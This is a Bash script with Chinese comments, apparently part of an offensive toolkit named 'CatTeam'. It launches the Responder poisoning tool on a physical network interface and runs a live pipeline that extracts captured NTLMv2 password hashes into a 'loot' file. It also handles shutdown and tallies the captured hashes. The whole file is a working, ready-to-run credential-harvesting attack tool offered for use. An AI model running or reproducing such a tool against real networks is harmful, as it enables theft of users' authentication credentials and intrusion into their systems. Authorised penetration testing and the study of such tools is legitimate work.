#!/bin/bash
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# 参数防崩溃 (前置于 config.sh 加载)
ACTION="${1:-}"
if [ -z "$ACTION" ]; then
    echo "用法: $0 --start | --stop"
    exit 1
fi

# --stop 时使用 latest 目录定位 PID 文件
if [ "$ACTION" == "--stop" ]; then
    export USE_LATEST=true
fi

source "$SCRIPT_DIR/config.sh"

echo -e "${YELLOW}>>> [CatTeam 模块: 投毒陷阱] 幽灵陷阱部署 (Mac 物理机原生版) <<<${NC}"

case "$ACTION" in
    --start)
        # 防重复点火：检测已有 Responder 进程
        if [ -f "$BASE_LOOT_DIR/latest/responder.pid" ]; then
            OLD_PID=$(cat "$BASE_LOOT_DIR/latest/responder.pid")
            if sudo kill -0 "$OLD_PID" 2>/dev/null; then
                log "${RED}[!] 陷阱已在运行中 (PID: $OLD_PID)！请先 --stop 回收。${NC}"
                exit 1
            fi
        fi

        init_loot_dir

        # 前置依赖检查
        if ! command -v python3 &>/dev/null; then
            log "${RED}[!] 需要 Python3！${NC}"
            exit 1
        fi
        if ! sudo python3 -c "from scapy.all import *" &>/dev/null; then
            log "${RED}[!] 缺失 scapy！修复: sudo python3 -m pip install scapy${NC}"
            exit 1
        fi
        if [ ! -f "$RESPONDER_PY_PATH" ]; then
            log "${RED}[!] 未找到 Responder: ${RESPONDER_PY_PATH}${NC}"
            log "${CYAN}[~] 安装: git clone https://github.com/lgandx/Responder && 更新 config.sh 中的 RESPONDER_PY_PATH${NC}"
            exit 1
        fi

        log "[-] 正在原生 Python 接管 $INTERFACE 物理网卡..."

        RAW_LOG="$LOOT_DIR/responder_raw.log"
        HASH_FILE="$LOOT_DIR/captured_hash.txt"

        # 启动 Responder 主进程 (宿主机原生，直接监听物理网卡)
        sudo python3 "$RESPONDER_PY_PATH" -I "$INTERFACE" -w -f > "$RAW_LOG" 2>&1 &
        RESPONDER_PID=$!
        echo "$RESPONDER_PID" > "$LOOT_DIR/responder.pid"

        # 实时 Hash 清洗伴生管线：Responder 日志 → 纯净 NTLMv2 Hash
        # 用 sed 截取 "NTLMv2-SSP Hash" 后面的完整内容，不会被冒号截断
        ( tail -f "$RAW_LOG" 2>/dev/null \
            | grep --line-buffered "NTLMv2-SSP Hash" \
            | sed 's/.*NTLMv2-SSP Hash[[:space:]]*:[[:space:]]*//' \
            >> "$HASH_FILE" ) &
        EXTRACTOR_PID=$!
        echo "$EXTRACTOR_PID" > "$LOOT_DIR/extractor.pid"

        log "${GREEN}[+] 幽灵陷阱已布下！(Responder PID: $RESPONDER_PID)${NC}"
        log "${GREEN}[+] Hash 清洗管线已建立 → $HASH_FILE${NC}"
        log "${CYAN}[~] 实时监控: tail -f $RAW_LOG${NC}"
        ;;

    --stop)
        log "[-] 正在回收陷阱与清洗进程..."

        # 得益于 USE_LATEST=true，$LOOT_DIR 已指向最新任务目录
        PID_FILE="$LOOT_DIR/responder.pid"
        EXT_PID_FILE="$LOOT_DIR/extractor.pid"

        if [ -f "$PID_FILE" ]; then
            R_PID=$(cat "$PID_FILE")
            log "[-] 绞杀 Responder (PID: $R_PID)..."
            sudo kill "$R_PID" 2>/dev/null || true
            sleep 1
            sudo kill -9 "$R_PID" 2>/dev/null || true
            rm -f "$PID_FILE"
        else
            log "${YELLOW}[!] 未找到 Responder PID 文件。${NC}"
        fi

        if [ -f "$EXT_PID_FILE" ]; then
            E_PID=$(cat "$EXT_PID_FILE")
            log "[-] 绞杀清洗管线 (PID: $E_PID)..."
            kill "$E_PID" 2>/dev/null || true
            # 导师批示修复: 杀掉管线内阻塞的 tail -f 子进程，防止变僵尸
            pkill -f "tail -f $LOOT_DIR/responder_raw.log" 2>/dev/null || true
            rm -f "$EXT_PID_FILE"
        fi

        # 统计战果
        if [ -f "$LOOT_DIR/captured_hash.txt" ] && [ -s "$LOOT_DIR/captured_hash.txt" ]; then
            HASH_COUNT=$(wc -l < "$LOOT_DIR/captured_hash.txt" | tr -d ' ')
            log "${GREEN}[+] 共捕获 ${HASH_COUNT} 条 NTLMv2 哈希，已存入 captured_hash.txt${NC}"
        else
            log "${YELLOW}[!] 本次未捕获到任何哈希。${NC}"
        fi

        log "${GREEN}[+] 战场清理完毕。${NC}"
        ;;

    *)
        echo "用法: $0 --start | --stop"
        ;;
esac
